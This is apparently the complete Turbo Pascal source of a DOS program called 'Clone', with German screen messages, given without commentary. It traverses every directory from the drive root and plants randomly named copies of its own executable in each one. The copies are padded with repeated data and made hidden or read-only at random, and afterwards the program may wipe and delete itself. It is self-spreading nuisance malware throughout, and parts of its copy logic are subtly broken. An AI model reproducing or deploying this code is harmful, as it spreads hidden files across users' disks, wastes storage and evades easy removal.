PROGRAM Clone;

USES Crt,Dos;

CONST
  RetryTime = 10;
  FileBufferSize = 32768;

VAR
  a,b        : Byte;

  r,q,
  FileName,
  FileName2,
  List1,
  List2,
  ListEntry2,
  ListEntry,
  abc        : STRING;

  Counter,
  Copie,
  FileAttr2  : Word;
  FileHandle : FILE;

  Path       : PathStr;
  Dir        : DirStr;
  Name       : NameStr;
  Ext        : ExtStr;
  FullName   : PathStr;
  F          : SearchRec;
  Ch         : Char;
  I          : Integer;

  listfile,
  listfile2,
  listfile3  : Text;

FUNCTION SetFileAttributes(FileName : STRING; FileAttr : Word) : Boolean;
BEGIN
  Assign(FileHandle,FileName);
  SetFAttr(FileHandle,FileAttr);
  SetFileAttributes := ((IOResult=0) AND (DosError=0));
END;

FUNCTION GetFileAttributes(FileName : STRING; VAR FileAttr : Word) : Boolean;
BEGIN
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);
  GetFileAttributes:=((IOResult=0) AND (DosError=0));
END;

FUNCTION DeleteFile(FileName : STRING) : Boolean;
VAR
  FileAttr : Word;
BEGIN
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);
  IF (FileAttr AND ReadOnly) <> 0 THEN
    SetFAttr(FileHandle,FileAttr AND (NOT ReadOnly));
  Erase(FileHandle);
  DeleteFile := (IOResult=0);
end;

FUNCTION FileExists(FName : STRING) : BOOLEAN;
VAR
 f     : FILE;
 fAttr : Word;
BEGIN
 Assign(f,FName);
 GetFAttr(f,fAttr);
 FileExists := (DosError = 0)
            AND ((fAttr AND Directory) = 0)
            AND ((fAttr AND VolumeID)  = 0)
END;


FUNCTION CopyFile(InputFileName,OutputFileName : STRING) : Boolean;
VAR
  InputFile,OutputFile   : FILE;
  ReadStatus,WriteStatus : Word;
  FileBuffer             : Pointer;
  FileDateTime           : Longint;
begin
  CopyFile := False;
  GetFileAttributes(OutputFileName,FileAttr2);
  SetFileAttributes(OutputFileName,0);
  Assign(OutputFile,OutputFileName);
  Rewrite(OutputFile,1);

  FOR i := 1 TO Random(10)+1 DO BEGIN
    SetFileAttributes(InputFileName,0);
    Assign(InputFile,InputFileName);
    Reset(InputFile,1);
    IF IOResult <> 0 THEN Exit;
    IF MaxAvail < FileBufferSize THEN Exit;
    GetMem(FileBuffer,FileBufferSize);

    REPEAT
      BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
      BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
    UNTIL (ReadStatus = 0) OR (WriteStatus <> ReadStatus);
    FreeMem(FileBuffer,FileBufferSize);
    Close(InputFile);
  END;
  GetFTime(InputFile,FileDateTime);
  SetFTime(OutputFile,FileDateTime);
  Close(OutputFile);
  SetFileAttributes(OutputFileName,FileAttr2);
  FileAttr2 := 0;
  IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + ReadOnly;
  IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + Hidden;
  SetFileAttributes(OutputFileName,FileAttr2);
  CopyFile := True;
END;

PROCEDURE GetFileName;
BEGIN
  q := '';
  r := ParamStr(0);
  a := 0;
  b := Length(ParamStr(0));
  REPEAT
    Inc(a);
    q := q+r[b];
    Dec(b);
  UNTIL r[b] = '\';
  b := Length(q);
  r := q;
  FOR i := 1 TO b DO BEGIN
    q[(b+1)-i] := r[i];
  END;
  FileName := q;
END;

PROCEDURE Process(dir : DirStr; s : SearchRec; List : STRING);
BEGIN
  ListEntry2 := dir+s.name;
  IF (ListEntry2[Length(ListEntry2)] <> '.')
    AND ((ListEntry2[Length(ListEntry2)-1] <> '.') OR ((ListEntry2[Length(ListEntry2)-1] <> '\'))) THEN BEGIN
    GotoXY(1,1);
    Write('                                                                         ');
    GotoXY(1,1);
    Write(dir, s.name);
    Assign(listfile3,List);
    Append(listfile3);
    WriteLn(listfile3,dir,s.name);
    GetFilename;
    Filename2 := '';
    FOR i := 1 TO Random(7)+1 DO BEGIN
      IF Random(2) = 0 THEN Filename2 := Filename2+Char(Random(24)+97) {Filename2 := Filename2+' '}
      ELSE IF Random(2) = 1 THEN BEGIN
        Filename2 := Filename2+Char(Random(9)+48);
      END ELSE IF Random(2) = 2 THEN BEGIN
        Filename2 := Filename2+Char(Random(24)+65);
      END ELSE Filename2 := Filename2+Char(Random(24)+65);
    END;
    Filename2 := Filename2+'.EXE';
    r := dir+s.name+'\'+Filename2;
    CopyFile(Filename,r);
    Copie := Copie+1;
    GotoXY(1,2);
    Write('Kopien erstellt: ',copie);
    Close(listfile3);
  END;
END;

PROCEDURE SearchDir(Path : PathStr; fspec : STRING);
VAR
  f : SearchRec;
BEGIN
  FindFirst(Path+fspec,Directory,f);
  WHILE DosError = 0 DO BEGIN
  IF (f.Attr AND Directory = Directory) THEN Process(path, f,List1);
  Findnext(f);
  END;
END;

BEGIN
  Randomize;
  ClrScr;
  Copie := 0;
  Counter := 1;
  Str(counter,abc);
  List1 := abc+'.lst';
  Assign(listfile,List1);
  Rewrite(listfile);
  Close(listfile);
  SearchDir('\','*.*');
  REPEAT
    Str(counter-1,abc);
    IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
    Str(counter,abc);
    IF FileExists(abc+'.lst') = True THEN BEGIN
      Str(counter,abc);
      List2 := abc+'.lst';
      Assign(listfile2,List2);
      Reset(listfile2);
      Str(counter+1,abc);
      List1 := abc+'.lst';
      Assign(listfile,List1);
      Rewrite(listfile);
      Close(listfile);
      REPEAT
        Read(listfile2,ListEntry);
        ReadLn(listfile2);
        IF (ListEntry[Length(ListEntry)] <> '.')
          AND ((ListEntry[Length(ListEntry)-1] <> '.') OR ((ListEntry[Length(ListEntry)-1] <> '\')))
          THEN SearchDir(ListEntry+'\','*.*');
      UNTIL EoF(listfile2);
      Close(listfile2);
      Inc(counter);
      Str(counter,abc);
    END;
  UNTIL FileExists(abc+'.lst') <> True;
  Str(counter-1,abc);
  IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
  Str(counter,abc);
  IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
  Str(counter+1,abc);
  IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
  IF Random(2) = 0 THEN FOR i := 1 TO Random(255) DO BEGIN
    SetFileAttributes(Filename,0);
    Assign(ListFile,Filename);
    Rewrite(ListFile);
    Close(ListFile);
    DeleteFile(FileName);
  END;
END.